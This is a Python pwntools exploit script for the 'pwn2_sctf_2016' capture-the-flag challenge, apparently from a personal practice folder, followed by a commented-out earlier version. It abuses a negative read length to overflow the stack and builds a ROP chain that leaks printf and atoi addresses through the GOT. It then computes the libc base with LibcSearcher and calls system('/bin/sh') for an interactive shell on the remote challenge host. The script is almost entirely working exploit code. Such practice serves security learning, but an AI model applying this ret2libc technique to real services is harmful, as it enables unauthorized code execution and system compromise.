from LibcSearcher import *
from pwn import *


def pwn2_sctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwn2_sctf_2016'):
    print('pwn2_sctf_2016 start')
    context(log_level='debug', arch='x86', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29321)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x0804835d)  # pop ebx ; ret
    pop2_ret_gadget = p32(0x0804864e)  # pop edi ; pop ebp ; ret
    vuln_addr = p32(target_elf.symbols['vuln'])
    printf_plt = p32(target_elf.plt['printf'])
    printf_got = p32(target_elf.got['printf'])
    atoi_got = p32(target_elf.got['atoi'])
    format_addr = p32(next(target_elf.search(b'You said: %s')))

    target.sendlineafter(b'How many bytes do you want me to read? ', b'-1')

    payload_1 = b'a' * 48
    # printf(printf_got)
    payload_1 += printf_plt + pop2_ret_gadget + format_addr + printf_got
    # printf(atoi)
    payload_1 += printf_plt + pop2_ret_gadget + format_addr + atoi_got
    # vuln()
    payload_1 += vuln_addr

    target.sendlineafter(b'bytes of data!\n', payload_1)
    target.recvline()
    target.recvuntil('You said: ')
    printf_addr = u32(target.recv(4))
    print(hex(printf_addr))
    atoi_addr = u32(target.recv(4))
    print(hex(atoi_addr))

    searcher = LibcSearcher('printf', printf_addr)
    # searcher.add_condition('atoi', atoi_addr)
    base_libc = printf_addr - searcher.dump('printf')
    system_addr = p32(base_libc + searcher.dump('system'))
    bin_sh_addr = p32(base_libc + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 48
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr
    target.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
    target.sendlineafter(b'bytes of data!\n', payload_2)
    target.interactive()

    print('pwn2_sctf_2016 end')


if __name__ == '__main__':
    pwn2_sctf_2016()
#
#
# from LibcSearcher import *
# from pwn import *
#
#
# def pwn2_sctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwn2_sctf_2016'):
#     print('pwn2_sctf_2016 start')
#     context(log_level='debug', arch='x86', os='linux')
#     target = process([file_name])
#     target = remote('node4.buuoj.cn', 26590)
#     target_elf = ELF(file_name)
#     libc_elf = ELF('.libc//libc-2.23.so')
#
#     pop_ret_gadget = p32(0x0804835d)  # pop ebx ; ret
#     pop2_ret_gadget = p32(0x0804864e) #  pop edi ; pop ebp ; ret
#     vuln_addr = p32(target_elf.symbols['vuln'])
#     printf_plt = p32(target_elf.plt['printf'])
#     printf_got = p32(target_elf.got['printf'])
#     format_addr = p32(next(target_elf.search(b'You said: %s')))
#
#
#     target.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
#
#     payload_1 = b'a' * 48
#     # printf(printf_got)
#     payload_1 += printf_plt + pop2_ret_gadget + format_addr + printf_got
#     # vuln()
#     payload_1 += vuln_addr
#
#     target.sendlineafter(b'bytes of data!\n', payload_1)
#     target.recvline()
#     target.recvuntil('You said: ')
#     printf_addr = u32(target.recv(4))
#     print(hex(printf_addr))
#
#     searcher = LibcSearcher('prinf', printf_addr)
#     base_libc = printf_addr - libc_elf.symbols['printf']
#     system_addr = p32(base_libc + libc_elf.symbols['system'])
#     bin_sh_addr = p32(base_libc + next(libc_elf.search('/bin/sh'.encode())))
#
#     payload_2 = b'a' * 48
#     payload_2 += system_addr + pop_ret_gadget + bin_sh_addr
#     target.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
#     target.sendlineafter(b'bytes of data!\n', payload_2)
#     target.interactive()
#
#
#
#     print('pwn2_sctf_2016 end')
#
#
# if __name__ == '__main__':
#     pwn2_sctf_2016()
#
#
